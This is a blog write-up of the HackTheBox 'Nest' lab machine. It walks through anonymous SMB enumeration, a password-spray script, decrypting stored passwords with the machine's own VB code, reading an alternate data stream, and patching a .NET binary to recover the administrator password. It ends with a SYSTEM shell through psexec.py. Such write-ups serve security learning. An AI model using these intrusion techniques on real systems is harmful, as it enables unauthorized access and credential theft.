<!doctype html><html lang=en dir=auto>
<head><meta charset=utf-8>
<meta http-equiv=x-ua-compatible content="IE=edge">
<meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no">
<meta name=robots content="index, follow">
<title>HackTheBox - Nest | Ef's log</title>
<meta name=keywords content="HackTheBox,Writeup,Cyber Security,Pentesting">
<meta name=description content="It's nested">
<meta name=author content="Fahmi FJ">
<link rel=canonical href=https://fahmifj.github.io/writeups/hackthebox/htb-nest/>
<meta name=google-site-verification content="LlCRq--iL8r1HTz1DMbMvQyX2lZjWD-KnwFeO_OWlg8">
<link crossorigin=anonymous href=https://fahmifj.github.io/assets/css/stylesheet.min.84dacdb01b1b6f491e8c2232dd12ef8f8ddff6dc8f3f27d004f62d2ae03d9790.css integrity="sha256-hNrNsBsbb0kejCIy3RLvj43f9tyPPyfQBPYtKuA9l5A=" rel="preload stylesheet" as=style>
<script defer crossorigin=anonymous src=https://fahmifj.github.io/assets/js/highlight.min.1213dd5c1417a6f375b942671a496e7f1658eb9f78d0463ce610015753d08128.js integrity="sha256-EhPdXBQXpvN1uUJnGklufxZY65940EY85hABV1PQgSg=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://fahmifj.github.io/favicon.ico>
<link rel=icon type=image/png sizes=16x16 href=https://fahmifj.github.io/favicon-16x16.png>
<link rel=icon type=image/png sizes=32x32 href=https://fahmifj.github.io/favicon-32x32.png>
<link rel=apple-touch-icon href=https://fahmifj.github.io/apple-touch-icon.png>
<link rel=mask-icon href=https://fahmifj.github.io/safari-pinned-tab.svg>
<meta name=theme-color content="#2e2e33">
<meta name=msapplication-TileColor content="#2e2e33">
<meta name=generator content="Hugo 0.88.1">
<script async src="https://www.googletagmanager.com/gtag/js?id=G-PDN0GP97D1"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','G-PDN0GP97D1',{anonymize_ip:!1})}</script>
<meta property="og:title" content="HackTheBox - Nest">
<meta property="og:description" content="It's nested">
<meta property="og:type" content="article">
<meta property="og:url" content="https://fahmifj.github.io/writeups/hackthebox/htb-nest/">
<meta property="og:image" content="https://fahmifj.github.io/writeups/hackthebox/htb-nest/imgs/image-20210416050308376.png"><meta property="article:section" content="writeups">
<meta property="article:published_time" content="2021-04-16T04:59:14+07:00">
<meta property="article:modified_time" content="2021-04-16T04:59:14+07:00">
<meta name=twitter:card content="summary_large_image">
<meta name=twitter:image content="https://fahmifj.github.io/writeups/hackthebox/htb-nest/imgs/image-20210416050308376.png">
<meta name=twitter:title content="HackTheBox - Nest">
<meta name=twitter:description content="It's nested">
<script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Write-ups","item":"https://fahmifj.github.io/writeups/"},{"@type":"ListItem","position":2,"name":"HackTheBox","item":"https://fahmifj.github.io/writeups/hackthebox/"},{"@type":"ListItem","position":3,"name":"HackTheBox - Nest","item":"https://fahmifj.github.io/writeups/hackthebox/htb-nest/"}]}</script>
<script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"HackTheBox - Nest","name":"HackTheBox - Nest","description":"It's nested","keywords":["HackTheBox","Writeup","Cyber Security","Pentesting"],"articleBody":"Nest is one of my favorite machines after Forest, I learned a lot about enumeration here, especially for SMB.\nNest starts with anonymous access on SMB, which allows me to obtain credentials of a temporary user. The credentials can be leveraged to read the other shares and obtain an encrypted password that belongs to c.smith. There is a VB project inside a directory that can not be reached unless you visit its full path. This project can be used to decrypt c.smith’s password. Enumerating c.smith home directory discovers a password for enabling debug mode of a custom application. With debug mode enabled, I’m able to read the application’s configuration and obtain encrypted Administrator password. By reversing the application, it allows me to decrypted the administrator password, and then use it gain administrator access.\nSkills Learned  SMB enumeration Alternate Data Stream Reversing .NET  Tools  Kali Linux (Attacking Machine) - https://www.kali.org/ Nmap - Preinstalled in Kali Linux smbclient - Preinstalled in Kali Linux Impacket - https://github.com/SecureAuthCorp/impacket  Reconnaissance Nmap nmap shows two ports open: SMB on port 445, and an unknown service on port 4386, but the fingerprints show it as ‘Reporting Service V1.2’.\n→ root@iamf «nest» «192.168.43.234» $ nmap -p1-5000 -sC -sV -oA nmap/nest 10.10.10.178 Nmap scan report for htb.nest (10.10.10.178) PORT STATE SERVICE VERSION 445/tcp open microsoft-ds? 4386/tcp open unknown | fingerprint-strings: | DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, X11Probe: | Reporting Service V1.2 | FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, RTSPRequest, SIPOptions: | Reporting Service V1.2 | Unrecognised command | Help: | Reporting Service V1.2 | This service allows users to run queries against databases using the legacy HQK format | AVAILABLE COMMANDS --- | LIST | SETDIR  | RUNQUERY  | DEBUG  |_ HELP  Host script results: |_clock-skew: -27s | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2020-04-28T15:16:46 |_ start_date: 2020-04-28T04:20:37 Enumeration TCP 445 - SMB Anonymous access is allowed here.\n→ root@iamf «nest» «192.168.43.234» $ smbclient -N -L //10.10.10.178/ Data share Enumeration on Data share with recurse mode shows two text files.\nOne of them is empty while the other one contains credentials for TempUser:Welcome2019.\n→ root@iamf «smb» «192.168.43.234» $ cat loot/Welcome\\ Email.txt We would like to extend a warm welcome to our newest member of staff,   You will find your home folder in the following location: \\\\HTB-NEST\\Users\\USERNAME If you have any issues accessing specific services or workstations, please inform the IT department and use the credentials below until all systems have been set up for you. Username: TempUser Password: welcome2019 Thank you HR With TempUsers, I could access the Secure$ share.\n Sorry if you annoyed by the red box, me too.\n Unfortunately, once I got to Secure$ share, I couldn’t list any single directory.\n→ root@iamf «smb» «192.168.43.234» $ smbclient -U 'TempUser%welcome2019' //10.10.10.178/Secure$ Try \"help\" to get a list of possible commands. smb: \\ recurse on smb: \\ ls NT_STATUS_ACCESS_DENIED listing \\Finance\\* NT_STATUS_ACCESS_DENIED listing \\HR\\* NT_STATUS_ACCESS_DENIED listing \\IT\\* On the other hand, I do user enumeration with rpcclient.\n With a little knowledge of scripting, I can filter the user.\n→ root@iamf «nest» «192.168.43.234» $ rpcclient -U 'TempUser%welcome2019' -c 'enumdomusers;quit' 10.10.10.178 | tr -d '[]' | cut -d ':' -f2 | cut -d ' ' -f1 Administrator C.Smith Guest Service_HQK TempUser I did a password spray using a simple bash script with a pattern of username:username, but no luck\n#!/bin/bash for u in `cat rpcusers.txt`; do echo -n “[*] user : $u “ \u0026\u0026 rpcclient -U “$u%$u” -c “getusername;quit” 10.10.10.178 done I also check on users' information to find a plain password in the description, but end up knowing the user flag is on c.smith.\n I went back to SMB, I decided to download all the content in the Data share.\n→ root@iamf «loot» «192.168.43.234» $ smbget -R smb://10.10.10.178/Data/ -U TempUser # or use mget * inside smbclient Here is the folder structure on Data\n→ root@iamf «Data» «192.168.43.234» $ tree . ├── IT │ ├── Archive │ ├── Configs │ │ ├── Adobe │ │ │ ├── editing.xml │ │ │ ├── Options.txt │ │ │ ├── projects.xml │ │ │ └── settings.xml │ │ ├── Atlas │ │ │ └── Temp.XML │ │ ├── DLink │ │ ├── Microsoft │ │ │ └── Options.xml │ │ ├── NotepadPlusPlus │ │ │ ├── config.xml │ │ │ └── shortcuts.xml │ │ ├── RU Scanner │ │ │ └── RU_config.xml │ │ └── Server Manager │ ├── Installs │ ├── Reports │ └── Tools ├── Production ├── Reports └── Shared ├── Maintenance │ └── Maintenance Alerts.txt └── Templates ├── HR │ └── Welcome Email.txt └── Marketing Notepad++ config on Data/IT/Configs/NotepadPlusPlus/config.xml contains interesting path.\n......  nbMaxFile=\"15\" inSubMenu=\"no\" customLength=\"-1\"  filename=\"C:\\windows\\System32\\drivers\\etc\\hosts\" /  filename=\"\\\\HTB-NEST\\Secure$\\IT\\Carl\\Temp.txt\" /  filename=\"C:\\Users\\C.Smith\\Desktop\\todo.txt\" /   Next, on /Data/IT/Configs/RU Scanner/RU_config.xml, I found a password that belongs to c.smith\n→ root@iamf «RU Scanner» «192.168.43.234» $ cat RU_config.xml   xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" 389 c.smith fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=  It looks like a base64 encoded at first, but it is encrypted:\n→ root@iamf «RU Scanner» «192.168.43.234» $ echo 'fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=' | base64 -d }13☺□♥□=X□J□BA□↓☺X*□Wc□f□□□?βc◄ Secure$ share User carl doesn’t appear on my enumeration with rpcclient, so after discovering this path \\\\HTB-NEST\\Secure$\\IT\\Carl\\, I went back to Secure$ share and performed a recursive download there.\n→ root@iamf «Data» «192.168.43.234» $ smbget -R smb://10.10.10.178/Secure$/IT/Carl/ -U TempUser Here is the Secure$ structure.\n→ root@iamf «Secure$» «192.168.43.234» $ tree . ├── Docs │ ├── ip.txt │ └── mmc.txt ├── Reports └── VB Projects ├── Production └── WIP └── RU ├── RUScanner │ ├── bin │ │ ├── Debug │ │ └── Release │ ├── ConfigFile.vb │ ├── Module1.vb │ ├── My Project │ │ ├── Application.Designer.vb │ │ ├── Application.myapp │ │ ├── AssemblyInfo.vb │ │ ├── Resources.Designer.vb │ │ ├── Resources.resx │ │ ├── Settings.Designer.vb │ │ └── Settings.settings │ ├── obj │ │ └── x86 │ ├── RU Scanner.vbproj │ ├── RU Scanner.vbproj.user │ ├── SsoIntegration.vb │ └── Utils.vb └── RUScanner.sln I just downloaded a VB Project. Based on Module1.vb’s content, RU_config.xml is loaded to the application, and from this line .Password = Utils.DecryptString(Config.Password), I know this application able to decrypt c.smith’s password.\n→ root@iamf «WIP» «192.168.43.234» $ cat RU/RUScanner/Module1.vb Module Module1 Sub Main() Dim Config As ConfigFile = ConfigFile.LoadFromFile(\"RU_Config.xml\") Dim test As New SsoIntegration With {.Username = Config.Username, .Password = Utils.DecryptString(Config.Password)} End Sub End Module Foothold Access as c.smith Decrypting c.smith password The encrypted password can be decrypted easily by taking out the utils class and the decrypt function from Utils.vb, then call it on the main function. I used https://dotnetfiddle.net/ for this.\nHere is how it looks like.\nImports System Imports System.Text Imports System.Security.Cryptography Public Module Module1 Public Sub Main() Dim encryptedPassword encryptedPassword = \"fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=\" Console.WriteLine(\"Decrypted Password: \" +Utils.DecryptString(encryptedPassword)) End Sub End Module Public Class Utils Public Shared Function DecryptString(EncryptedString As String) As String If String.IsNullOrEmpty(EncryptedString) Then Return String.Empty Else Return Decrypt(EncryptedString, \"N3st22\", \"88552299\", 2, \"464R5DFA5DL6LE28\", 256) End If End Function Public Shared Function Decrypt(ByVal cipherText As String, _ ByVal passPhrase As String, _ ByVal saltValue As String, _ ByVal passwordIterations As Integer, _ ByVal initVector As String, _ ByVal keySize As Integer) _ As String Dim initVectorBytes As Byte() initVectorBytes = Encoding.ASCII.GetBytes(initVector) Dim saltValueBytes As Byte() saltValueBytes = Encoding.ASCII.GetBytes(saltValue) Dim cipherTextBytes As Byte() cipherTextBytes = Convert.FromBase64String(cipherText) Dim password As New Rfc2898DeriveBytes(passPhrase, _ saltValueBytes, _ passwordIterations) Dim keyBytes As Byte() keyBytes = password.GetBytes(CInt(keySize / 8)) Dim symmetricKey As New AesCryptoServiceProvider symmetricKey.Mode = CipherMode.CBC Dim decryptor As ICryptoTransform decryptor = symmetricKey.CreateDecryptor(keyBytes, initVectorBytes) Dim memoryStream As IO.MemoryStream memoryStream = New IO.MemoryStream(cipherTextBytes) Dim cryptoStream As CryptoStream cryptoStream = New CryptoStream(memoryStream, _ decryptor, _ CryptoStreamMode.Read) Dim plainTextBytes As Byte() ReDim plainTextBytes(cipherTextBytes.Length) Dim decryptedByteCount As Integer decryptedByteCount = cryptoStream.Read(plainTextBytes, _ 0, _ plainTextBytes.Length) memoryStream.Close() cryptoStream.Close() Dim plainText As String plainText = Encoding.ASCII.GetString(plainTextBytes, _ 0, _ decryptedByteCount) Return plainText End Function End Class Now I have c.smith’s password, xRxRxPANCAK3SxRxRx\n Users share With c.smith credentials, I do more enumeration on SMB. First, I’ll look into the c.smith home directory.\n→ root@iamf «smb» «192.168.43.234» $ smbclient -U 'c.smith%xRxRxPANCAK3SxRxRx' //10.10.10.178/Users Try \"help\" to get a list of possible commands. smb: \\C.Smith\\ dir . D 0 Sun Jan 26 02:21:44 2020 .. D 0 Sun Jan 26 02:21:44 2020 HQK Reporting D 0 Thu Aug 8 19:06:17 2019 user.txt A 32 Thu Aug 8 19:05:24 2019 I downloaded those files recursively to my machine.\n→ root@iamf «c.smith» «192.168.43.234» $ tree . ├── HQK Reporting │ ├── AD Integration Module │ │ └── HqkLdap.exe │ ├── Debug Mode Password.txt │ └── HQK_Config_Backup.xml └── user.txt user.txt is the user flag.\n→ root@iamf «c.smith» «192.168.43.234» $ cat user.txt cf71b25404be5d84fd827e05f426e987 HQK_Config_Backup.xml doesn’t contains any useful information\n→ root@iamf «c.smith» «192.168.43.234» $ cat HQK\\ Reporting/HQK_Config_Backup.xml   xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" 4386 C:\\Program Files\\HQK\\ALL QUERIES  Debug Mode Password.txt is empty file. But when I thought it was empty, I asked a hint for this.\nThis file is embedded with Alternate Data Stream (ADS). By using the allinfo command on the SMB, I can see it contains another data stream, Password:$Data.\n To get that stream, I can just append :Password:$Data at the end of the file name.\nsmb: \\C.Smith\\HQK Reporting\\ allinfo \"Debug Mode Password.txt\" altname: DEBUGM~1.TXT create_time: Thu Aug 8 07:06:12 PM 2019 EDT access_time: Thu Aug 8 07:06:12 PM 2019 EDT write_time: Thu Aug 8 07:08:17 PM 2019 EDT change_time: Thu Aug 8 07:08:17 PM 2019 EDT attributes: A (20) stream: [::$DATA], 0 bytes stream: [:Password:$DATA], 15 bytes smb: \\C.Smith\\HQK Reporting\\ get \"Debug Mode Password.txt\":Password:$DATA getting file \\C.Smith\\HQK Reporting\\Debug Mode Password.txt:Password:$DATA of size 15 as Debug Mode Password.txt:Password:$DATA (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec) Now I can use the cat command to see the file content.\n→ root@iamf «c.smith» «192.168.43.234» $ cat Debug\\ Mode\\ Password.txt:Password:\\$DATA WBQ201953D8w Privilege Escalation Shell as NT Authority\\System Examination on HQK Reporting Service v1.2 When visiting http://10.10.10.178:4386/, the browser return a session timeout with  symbol, this could imply that this service is cli-based\nWith telnet, I could access this service.\n→ root@iamf «c.smith» «192.168.43.234» $ telnet 10.10.10.178 4386 With debug mode enabled, it shows more commands.\ndebug WBQ201953D8w Took me a minute to understand the commands, so basically\n LIST is to list directory, SHOWQUERY is to show file content, RUNQUERY is to execute. SETDIR is change directory.  Looking up into the LDAP directory, there’s ldap.conf that contains administrator credentials with another encrypted password.\n I have a copy of HqkLdap.exe on c.smith’s loot directory. So I decided to copy HqkLdap.exe from Kali to Windows and inspect the binary.I also created a copy of Ldap.conf.\nReversing HQKLdap.exe Running strings HqkLdap.exe againts the app, I discovered that it was built with.NET, and there are no hard-coded credentials.\nUsing immunity/ollydbg is waste of time because I can’t really read assembly, instead I have a very useful tool for reversing and debugging .NET applications called dnSpy. It’s free on Github.\n dnSpy: https://github.com/0xd4d/dnSpy/releases  For this I’ll go straight to the application main function.\n To run this program properly, a config file, which is ldap.conf, must be served as an argument to the application, and it also needs the presences of HqkDbImport.exe (These two must exist in the same folder)\nSo if I run it and I don’t fulfill the check, it will complain like this:\nPS C:\\Users\\fahmi\\Desktop.\\HqkLdap.exe Ldap.conf Please ensure the optional database import module is installed Next, I investigated the decrypt function, which was called on the main after the checks were completed.\n On the next block, I see ldapSearchSettings.Password is assigned to ldap.password\n From here, what I can try is:\n Remove the part of codes that used to check for the existence of HqkDbImport.exe Add another line to print out the password from ldap.Password.  I’ll use the edit feature to edit the main class.\nAlso, I’ll get rid the line that used to check the existence of HqkDbImport.exe\npublic static void Main() { checked { try { if (MyProject.Application.CommandLineArgs.Count != 1) { Console.WriteLine(\"Invalid number of command line arguments\"); } else if (!File.Exists(MyProject.Application.CommandLineArgs[0])) { Console.WriteLine(\"Specified config file does not exist\"); } else { ...snip ... Then I’ll add a new line code on the main function at line 56 to print ldap.Password to the console.\n I tried to compile it back but then there was an error about the unassigned local variable ‘enumerator’, so I deleted that variable and tried to compile it back.\n It succeeded and I can export the modified program.\nNow I can just run it and provide the ldap.conf as its argument and it works!\n The password is: XtH4nkS4Pl4y1nGX\npsexec.py I can gain access as local system on the box using administrator account and the decrypted password with psexec.py\n→ root@iamf «c.smith» «192.168.43.234» $ psexec.py HTB-NEST/Administrator:XtH4nkS4Pl4y1nGX@10.10.10.178 Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation [*] Requesting shares on 10.10.10.178..... [*] Found writable share ADMIN$ [*] Uploading file nQyIIpWk.exe [*] Opening SVCManager on 10.10.10.178..... [*] Creating service gfCe on 10.10.10.178..... [*] Starting service gfCe..... [!] Press help for extra shell commands Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Microsoft Corporation. All rights reserved. C:\\Windows\\system32whoami nt authority\\system  References  https://superuser.com/questions/1520250/read-alternate-data-streams-over-smb-with-linux  ","wordCount":"2161","inLanguage":"en","image":"https://fahmifj.github.io/writeups/hackthebox/htb-nest/imgs/image-20210416050308376.png","datePublished":"2021-04-16T04:59:14+07:00","dateModified":"2021-04-16T04:59:14+07:00","author":{"@type":"Person","name":"Fahmi FJ"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://fahmifj.github.io/writeups/hackthebox/htb-nest/"},"publisher":{"@type":"Organization","name":"Ef's log","logo":{"@type":"ImageObject","url":"https://fahmifj.github.io/favicon.ico"}}}</script>
</head>
<body class=dark id=top>
<script>localStorage.getItem("pref-theme")==="light"&&document.body.classList.remove('dark')</script>
<noscript>
<style type=text/css>#theme-toggle,.top-link{display:none}</style>
</noscript>
<header class="header sticky">
<nav class=nav>
<div class=menu-wrapper>
<div class=logo>
<a href=https://fahmifj.github.io/ accesskey=h title=友人F>友人F</a>
</span>
</div>
<ul id=menu onscroll=menu_on_scroll()>
<li>
<a href=https://fahmifj.github.io/about/ title=About>About</a>
</li>
<li>
<a href=https://fahmifj.github.io/archives/ title=Archives>Archives</a>
</li>
<li>
<a href=https://fahmifj.github.io/projects/ title=Projects>Projects</a>
</li>
<li>
<a href=https://fahmifj.github.io/search/ title="Search (Alt + /)" accesskey=/>Search</a>
</li>
</ul>
<span class=logo-switches>
<button id=theme-toggle accesskey=t title><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="25" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg>
</button>
</div>
</nav>
</header>
<main class=main>
<article class=post-single>
<header class=post-header>
<h1 class=post-title>
HackTheBox - Nest
</h1>
<div class=post-description>
It's nested
</div>
<div class=post-meta>
April 16, 2021&nbsp;·&nbsp;11 min&nbsp;·&nbsp;Fahmi FJ
</div>
</header>
<div class=post-content-wrapper><div class=toc>
<div class=inner><ul>
<li>
<a href=#reconnaissance aria-label=Reconnaissance>Reconnaissance</a><ul>
<li>
<a href=#nmap aria-label=Nmap>Nmap</a></li></ul>
</li>
<li>
<a href=#enumeration aria-label=Enumeration>Enumeration</a><ul>
<li>
<a href=#tcp-445---smb aria-label="TCP 445 - SMB">TCP 445 - SMB</a></li></ul>
</li>
<li>
<a href=#foothold aria-label=Foothold>Foothold</a><ul>
<li>
<a href=#access-as-csmith aria-label="Access as c.smith">Access as c.smith</a></li></ul>
</li>
<li>
<a href=#privilege-escalation aria-label="Privilege Escalation">Privilege Escalation</a><ul>
<li>
<a href=#shell-as-nt-authoritysystem aria-label="Shell as NT Authority\System">Shell as NT Authority\System</a></li></ul>
</li>
<li>
<a href=#references aria-label=References>References</a>
</li>
</ul>
</div>
</details>
</div>
<div class=post-content>
<figure class=entry-cover>
<img loading=lazy srcset="https://fahmifj.github.io/writeups/hackthebox/htb-nest/imgs/image-20210416050308376_hu7b97ed3afb900db888abaf6fda51926e_129280_360x0_resize_box_3.png 360w ,https://fahmifj.github.io/writeups/hackthebox/htb-nest/imgs/image-20210416050308376_hu7b97ed3afb900db888abaf6fda51926e_129280_480x0_resize_box_3.png 480w ,https://fahmifj.github.io/writeups/hackthebox/htb-nest/imgs/image-20210416050308376_hu7b97ed3afb900db888abaf6fda51926e_129280_720x0_resize_box_3.png 720w ,https://fahmifj.github.io/writeups/hackthebox/htb-nest/imgs/image-20210416050308376.png 742w" sizes="(min-width: 768px) 720px, 100vw" src=https://fahmifj.github.io/writeups/hackthebox/htb-nest/imgs/image-20210416050308376.png alt="HackTheBox - Nest" width=742 height=467>
<p>HackTheBox - Nest</p>
</figure><p>Nest is one of my favorite machines after Forest, I learned a lot about enumeration here, especially for SMB.</p>
<p>Nest starts with anonymous access on SMB, which allows me to obtain credentials of a temporary user. The credentials can be leveraged to read the other shares and obtain an encrypted password that belongs to <code>c.smith</code>. There is a VB project inside a directory that can not be reached unless you visit its full path. This project can be used to decrypt <code>c.smith</code>&rsquo;s password. Enumerating <code>c.smith</code> home directory discovers a password for enabling debug mode of a custom application. With debug mode enabled, I&rsquo;m able to read the application&rsquo;s configuration and obtain encrypted Administrator password. By reversing the application, it allows me to decrypted the administrator password, and then use it gain administrator access.</p>
<h4 id=skills-learned>Skills Learned<a class=anchor aria-hidden=true href=#skills-learned>#</a></h4>
<ul>
<li>SMB enumeration</li>
<li>Alternate Data Stream</li>
<li>Reversing .NET</li>
</ul>
<h4 id=tools>Tools<a class=anchor aria-hidden=true href=#tools>#</a></h4>
<ul>
<li>Kali Linux (Attacking Machine) - <a href=https://www.kali.org/>https://www.kali.org/</a></li>
<li>Nmap - Preinstalled in Kali Linux</li>
<li>smbclient - Preinstalled in Kali Linux</li>
<li>Impacket - <a href=https://github.com/SecureAuthCorp/impacket>https://github.com/SecureAuthCorp/impacket</a></li>
</ul>
<h2 id=reconnaissance>Reconnaissance<a class=anchor aria-hidden=true href=#reconnaissance>#</a></h2>
<h3 id=nmap>Nmap<a class=anchor aria-hidden=true href=#nmap>#</a></h3>
<p><code>nmap</code> shows two ports open: SMB on port 445, and an unknown service on port 4386, but the fingerprints show it as &lsquo;Reporting Service V1.2&rsquo;.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>→ root@iamf «nest» «192.168.43.234»
$ nmap -p1-5000 -sC -sV -oA nmap/nest 10.10.10.178
Nmap scan report <span class=k>for</span> htb.nest <span class=o>(</span>10.10.10.178<span class=o>)</span>
PORT    STATE SERVICE       VERSION
445/tcp open  microsoft-ds?
4386/tcp open  unknown                                                                                       
<span class=p>|</span> fingerprint-strings:                                                                                       
<span class=p>|</span>   DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, X11Probe: 
<span class=p>|</span>     Reporting Service V1.2                                                                                 
<span class=p>|</span>   FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, RTSPRequest, SIPOptions: 
<span class=p>|</span>     Reporting Service V1.2
<span class=p>|</span>     Unrecognised <span class=nb>command</span>
<span class=p>|</span>   Help:          
<span class=p>|</span>     Reporting Service V1.2
<span class=p>|</span>     This service allows users to run queries against databases using the legacy HQK format
<span class=p>|</span>     AVAILABLE COMMANDS ---                  
<span class=p>|</span>     LIST   
<span class=p>|</span>     SETDIR &lt;Directory_Name&gt;
<span class=p>|</span>     RUNQUERY &lt;Query_ID&gt;          
<span class=p>|</span>     DEBUG &lt;Password&gt;
<span class=p>|</span>_    HELP &lt;Command&gt; 

Host script results:
<span class=p>|</span>_clock-skew: -27s
<span class=p>|</span> smb2-security-mode:
<span class=p>|</span>   2.02:
<span class=p>|</span>_    Message signing enabled but not required
<span class=p>|</span> smb2-time:
<span class=p>|</span>   date: 2020-04-28T15:16:46
<span class=p>|</span>_  start_date: 2020-04-28T04:20:37
</code></pre></div><h2 id=enumeration>Enumeration<a class=anchor aria-hidden=true href=#enumeration>#</a></h2>
<h3 id=tcp-445---smb>TCP 445 - SMB<a class=anchor aria-hidden=true href=#tcp-445---smb>#</a></h3>
<p>Anonymous access is allowed here.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>→ root@iamf «nest» «192.168.43.234»
$ smbclient -N -L //10.10.10.178/
</code></pre></div><p><img src=imgs/image-20210416095936362.png alt=image-20210416095936362 style=zoom:80%></p>
<h4 id=data-share>Data share<a class=anchor aria-hidden=true href=#data-share>#</a></h4>
<p>Enumeration on <code>Data</code> share with recurse mode shows two text files.</p>
<p><img src=imgs/image-20210416095856849.png alt=image-20210416095856849 style=zoom:80%></p>
<p>One of them is empty while the other one contains credentials for <code>TempUser:Welcome2019</code>.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>→ root@iamf «smb» «192.168.43.234»
$ cat loot/Welcome<span class=se>\ </span>Email.txt
We would like to extend a warm welcome to our newest member of staff, &lt;FIRSTNAME&gt; &lt;SURNAME&gt;

You will find your home folder in the following location:
<span class=se>\\</span>HTB-NEST<span class=se>\U</span>sers<span class=se>\&lt;</span>USERNAME&gt;

If you have any issues accessing specific services or workstations, please inform the
IT department and use the credentials below <span class=k>until</span> all systems have been <span class=nb>set</span> up <span class=k>for</span> you.

Username: TempUser
Password: welcome2019


Thank you
HR
</code></pre></div><p>With <code>TempUsers</code>, I could access the <code>Secure$</code> share.</p>
<blockquote>
<p>Sorry if you annoyed by the red box, me too.</p>
</blockquote>
<p><img src=imgs/image-20210416100016140.png alt=image-20210416100016140 style=zoom:80%></p>
<p>Unfortunately, once I got to <code>Secure$</code> share, I couldn&rsquo;t list any single directory.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>→ root@iamf «smb» «192.168.43.234»
$  smbclient -U <span class=s1>&#39;TempUser%welcome2019&#39;</span> //10.10.10.178/Secure$ 
Try <span class=s2>&#34;help&#34;</span> to get a list of possible commands.
smb: <span class=se>\&gt;</span> recurse on
smb: <span class=se>\&gt;</span> ls
NT_STATUS_ACCESS_DENIED listing <span class=se>\F</span>inance<span class=se>\*</span>
NT_STATUS_ACCESS_DENIED listing <span class=se>\H</span>R<span class=se>\*</span>
NT_STATUS_ACCESS_DENIED listing <span class=se>\I</span>T<span class=se>\*</span>
</code></pre></div><p>On the other hand, I do user enumeration with <code>rpcclient</code>.</p>
<p><div class=img-container><img src=imgs/image-20210416100040356.png alt=image-20210416100040356></div>
</p>
<p>With a little knowledge of scripting, I can filter the user.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>→ root@iamf «nest» «192.168.43.234»
$  rpcclient -U <span class=s1>&#39;TempUser%welcome2019&#39;</span> -c <span class=s1>&#39;enumdomusers;quit&#39;</span> 10.10.10.178 <span class=p>|</span> tr -d <span class=s1>&#39;[]&#39;</span> <span class=p>|</span> cut -d <span class=s1>&#39;:&#39;</span> -f2 <span class=p>|</span> cut -d <span class=s1>&#39; &#39;</span> -f1
Administrator
C.Smith
Guest
Service_HQK
TempUser
</code></pre></div><p>I did a password spray using a simple bash script with a pattern of <code>username:username</code>, but no luck</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=cp>#!/bin/bash
</span><span class=cp></span><span class=k>for</span> u in <span class=sb>`</span>cat rpcusers.txt<span class=sb>`</span><span class=p>;</span> <span class=k>do</span> 
 <span class=nb>echo</span> -n “<span class=o>[</span>*<span class=o>]</span> user : <span class=nv>$u</span> “ <span class=o>&amp;&amp;</span> 
 rpcclient -U “<span class=nv>$u</span>%<span class=nv>$u</span>” -c “getusername<span class=p>;</span>quit” 10.10.10.178
<span class=k>done</span>
</code></pre></div><p>I also check on users' information to find a plain password in the description, but end up knowing the user flag is on <code>c.smith</code>.</p>
<p><div class=img-container><img src=https://cdn-images-1.medium.com/max/1000/1*7NAs7fNGkLwtNwZsGjTkRw.png alt=img></div>
</p>
<p>I went back to SMB, I decided to download all the content in the <code>Data</code> share.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>→ root@iamf «loot» «192.168.43.234»
$ smbget -R smb://10.10.10.178/Data/ -U TempUser  <span class=c1># or use mget * inside smbclient</span>
</code></pre></div><p>Here is the folder structure on <code>Data</code></p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>→ root@iamf «Data» «192.168.43.234»
